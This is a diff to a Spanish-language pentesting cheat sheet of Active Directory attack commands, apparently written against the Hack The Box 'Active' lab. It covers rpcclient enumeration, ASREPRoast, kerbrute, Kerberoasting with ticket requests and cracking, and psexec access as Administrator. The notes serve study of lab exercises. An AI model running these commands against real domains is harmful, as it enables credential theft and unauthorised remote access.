@@ -94,7 +94,61 @@ Con credenciales, Info de un  usuario por su id:
 rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'queryguser 0x1f4'
 </pre>
 
-Con credenciales, Info de un  usuario por su id:
+Con credenciales, ver las desripciones de todos los usuarios:
 <pre>
-rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'queryguser 0x1f4'
+rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'querygdispinfo'
 </pre>
+
+### rpcenum
+
+Herramienta de s4vitar para enumerar usuarios y grupos de un dominio. Revisar m´áquina Active de HTB para ver como configurarla.
+
+### ASREPRoast Attack
+
+Cuando solo se dispone de usuarios, sin credenciales, **y estando en un entorno de active directory** se puede intentar un ASREPRoast Attack con GetNPUsers:
+<pre>
+GetNPUsers.py active.htb/ -no-pass -usersfile users.txt 
+</pre>
+
+### Kerbrute
+
+Si está el puerto de kerberos aberto, el 88, se puede usar kerbrute para enumerar teniendo un diccionario.
+<pre>
+kerbrute userenum -dc 10.10.10.100 -d active.htb /usr/share/wordlists/SecList/Usernames/Names/names.txt
+</pre>
+
+### GetUsersSPNs
+
+Si no es Kerberoasteable podemos usar esta opción para enumerar.
+
+<pre>
+GetUsersSPNs.py active.htb/USUARIO:CONTRASEÑA
+</pre>
+
+Si hay resultado se puede obtener un TGS, (Ticket Garanting Service). El hash se puede intentar romper con john
+
+
+<pre>
+GetUsersSPNs.py active.htb/USUARIO:CONTRASEÑA -request
+</pre>
+
+
+### PSEXEC
+
+Si con **crackmapexec smb** nos aparece **Pwned** podemos obtener acceso con psexec:
+
+<pre>
+psexec.py active.htb/Administrator:CONTRASEÑA@10.10.10.100 cmd.exe
+</pre>
+
+## TRUCOS
+
+### Sincronizar reloj
+
+Para ataques ASREPRoast o kerbrute hay que sincronizar el reloj con el de la maquina active directory:
+
+<pre>
+ntpdate 10.10.10.100
+</pre>
+
+Con **date -s** podemos volver a dejar la fecha igual. Investigar como.
